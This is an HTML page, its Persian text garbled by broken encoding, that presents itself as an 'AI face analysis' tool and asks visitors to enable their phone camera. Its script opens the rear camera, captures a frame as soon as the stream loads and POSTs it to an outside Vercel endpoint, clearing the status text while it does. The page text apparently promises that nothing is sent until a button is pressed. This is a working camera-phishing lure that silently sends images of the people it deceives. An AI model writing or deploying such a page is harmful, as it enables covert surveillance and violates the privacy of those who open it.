<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ai</title>
    <style>
        * { box-sizing: border-box;  padding: 0; margin: 0; }
        body{ background-color: #fff155;  }
        .main { font-family: tahoma, sans-serif; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;  margin: 0; }
        .container { text-align: center; width: 90%; max-width: 500px; }
        video { width: 100%; border-radius: 10px;  }
        canvas { display: none; }
        .status { margin-top: 15px; font-size: 14px; color: #00ff00; }
        .recording-dot { display: inline-block; width: 10px; height: 10px; background-color: red; border-radius: 50%; animation: blink 1s infinite; margin-left: 5px; }
        @keyframes blink { 50% { opacity: 0; } }
     
body{
    font-family: "sans";
    padding: 0 12px;
}
h2 , h3{
    text-align: center;
}
p{
    background: hsl(194, 44%, 25%)000;
    color: rgb(120, 255, 120);
    padding: 12px;
    border-radius: 12px;
    font-weight: bold;
    margin-bottom: 23px;
 
}
.nav{
    margin-top: 23px;
}
.buttun{
    text-align: center;
    
}
.send{
    padding: 15px;
    background: #74ff55;
    font-family: "sans";
    font-weight: bold;
    border-radius: 14px;

    margin-bottom: 12px;
}
        .ali{
          background: #ff681d;
        font-size:19px;
        }
    </style>
  
</head>
<body>
   <div class="nav">
    <h2>Ø¨Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø¢Ù†Ø§Ù„ÛŒØ² Ú†Ù‡Ø±Ù‡ Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒÙ†ğŸ˜ŠğŸ˜</h2>
    <h3>Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø§Ø¨ØªØ¯Ø§ Ø¨Ø§ÛŒØ¯ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ú¯ÙˆØ´ÛŒ Ø®ÙˆØ¯ Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯ğŸ“¸</h3>
    <p>
        Ùˆ Ø§ÛŒÙ†Ú©Ù‡ Ø§ÛŒÙ† Ù†Ø³Ø®Ù‡ Ø§ÙˆÙ„ÛŒØ³Øª Ùˆ Ù…Ù…Ú©Ù†Ù‡ Ø¨Ø§Ú¯ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ù‡ØŒ Ù¾Ø³ Ø§Ú¯Ù‡ Ù…Ø´Ú©Ù„ÛŒ Ø¨ÙˆØ¯ Ø¨Ù‡Ù…ÙˆÙ† Ø§Ø·Ù„Ø§Ø¹ Ø¨Ø¯ÛŒÙ†ğŸ™.<br/>
        Ø¯Ø± Ø¢ÛŒÙ†Ø¯Ù‡ Ù†Ú†Ù†Ø¯Ø§Ù† Ø¯ÙˆØ± Ø§ÛŒÙ† ØµÙØ­Ù‡ ÛŒÛŒ Ú©Ù‡ Ø§Ù„Ø§Ù† Ù…ÛŒØ¨ÛŒÙ†ÛŒÙ† Ø¨Ù‡ ÛŒÚ© Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù† Ú©Ø§Ù…Ù„ ØªØ¨Ø¯ÛŒÙ„ Ù…ÛŒØ´Ù‡ Ú©Ù‡ Ø§Ù…Ú©Ø§Ù†Ø§Øª Ø¨ÛŒØ´ØªØ±ÛŒ Ø¯Ø§Ø±Ù‡ğŸš€.
        <br/>
        Ù¾Ø³ Ø§Ú¯Ù‡ Ø§ÛŒÙ† ØµÙØ­Ù‡ Ù…ÙˆØ±Ø¯ Ù¾Ø³Ù†Ø¯ Ø´Ù…Ø§ Ù†Ø¨ÙˆØ¯ Ø§Ø² Ø´Ù…Ø§ Ø¹Ø°Ø± Ø®ÙˆØ§Ù‡ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ…ğŸ™
    </p>
    <button class="send ali" id="startBtn">Ø¨Ø±Ø§ÛŒ Ú©Ø§Ø± Ø¨Ø§ Ø±Ø¨Ø§Øª Ø§ÙˆÙ„ Ø§ÛŒÙ† Ø¯Ú©Ù…Ù‡ Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯ </button>
       
   </div>
<div class="main">
    <div class="container">
        <h2></h2>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <div class="status">
       
            <span id="log">Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ Ø§Ø±ØªØ¨Ø§Ø·...</span>
        </div>
    </div>
</div>
<div class="buttun">
    <h2>ØªØ§ Ù…ÙˆÙ‚Ø¹ÛŒ Ú©Ù‡ Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ /Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³/ Ù†Ø²Ø¯ÛŒØ¯ Ø¹Ú©Ø³ Ø§Ø±Ø³Ø§Ù„ Ù†Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯<br/> 
    
     Ø§ÛŒÙ†Ú©Ù‡ Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ†Ú©Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø±Ø§Ø­Øª ØªØ± Ø¨ØªÙˆÙ†Ù‡ Ú†Ù‡Ø± Ø´Ù…Ø§Ø±Ùˆ Ø¢Ù†Ø§Ù„ÛŒØ² Ú©Ù†Ù‡ Ù„Ø·ÙØ§ Ø¯Ø± Ø¬Ø§ÛŒÛŒ Ù‚Ø±Ø§Ø± Ø¨Ú¯ÛŒØ±ÛŒØ¯ Ú©Ù‡ Ú†Ù‡Ø±Ù‡ Ø´Ù…Ø§ ÙˆØ§Ø¶Ø­ Ø¨Ø§Ø´Ù‡.ğŸ˜ŠğŸ˜Š
    </h2>
    <button class="send" id="button">Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³</button>
</div>
<script>

    // âœ… ØªØ¹Ø±ÛŒÙ Ù…ØªØºÛŒØ±Ù‡Ø§ Ø¨Ø± Ø§Ø³Ø§Ø³ Ø³Ø§Ø®ØªØ§Ø± Ø¬Ø¯ÛŒØ¯ HTML
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const log = document.getElementById('log');
    const startBtn = document.getElementById('startBtn');
    // âŒ controlsDiv Ø­Ø°Ù Ø´Ø¯Ù‡ Ø§Ø³Øª
    const sendManualBtn = document.getElementById('button'); // ID Ø¯Ú©Ù…Ù‡ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³

    let streamActive = false;

    // --- R1: Ø´Ø±ÙˆØ¹ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø§ÙˆÙ„ÛŒÙ† Ø¹Ú©Ø³ ---
    startBtn.addEventListener('click', async () => {
        startBtn.style.display = 'none';
        
        // âŒ Ø®Ø·ÙˆØ· Ù…Ø±Ø¨ÙˆØ· Ø¨Ù‡ controlsDiv Ø­Ø°Ù Ø´Ø¯Ù†Ø¯
        
        video.style.display = 'block'; 
        sendManualBtn.style.display = 'block'; // âœ… Ù†Ù…Ø§ÛŒØ´ Ø¯Ú©Ù…Ù‡ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³
        log.innerText = "Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…Ø¬ÙˆØ² Ø¯ÙˆØ±Ø¨ÛŒÙ†...";
        startCamera();
    });

    // --- R2: Ø¯Ú©Ù…Ù‡ Ø§Ø±Ø³Ø§Ù„ Ø¯Ø³ØªÛŒ ---
    sendManualBtn.addEventListener('click', () => {
        if (streamActive) {
            log.innerText = "";
            captureAndSend();
        } else {
            log.innerText = "âš ï¸ Ø§Ø¨ØªØ¯Ø§ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ø§ÛŒØ¯ ÙØ¹Ø§Ù„ Ø´ÙˆØ¯.";
        }
    });

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                audio: false 
            });

            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                log.innerText = "";
                streamActive = true;
                
                // Ú¯Ø±ÙØªÙ† Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø§ÙˆÙ„ÛŒÙ† Ø¹Ú©Ø³ Ø¨Ù„Ø§ÙØ§ØµÙ„Ù‡ Ù¾Ø³ Ø§Ø² Ù„ÙˆØ¯ Ø´Ø¯Ù† (R1)
                captureAndSend();
            };

        } catch (err) {
            log.innerText = "âŒ Ø®Ø·Ø§: Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† ØµØ§Ø¯Ø± Ù†Ø´Ø¯.";
            console.error(err);
        }
    }

    async function captureAndSend() {
        if (!streamActive || video.videoWidth === 0) return;

        // ØªÙ†Ø¸ÛŒÙ… Ø§Ø¨Ø¹Ø§Ø¯ Canvas
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            if(blob) sendToBackend(blob);
        }, 'image/jpeg', 0.8); // Ú©ÛŒÙÛŒØª 80%
    }

    async function sendToBackend(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'manual-cam-photo.jpg');

        try {
            log.innerText = "";
            await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
            log.innerText = `âœ… Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙÙ‚.`; 
        } catch (e) {
            log.innerText = "âš ï¸ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ±.";
        }
    }

</script>

</body>

</html>







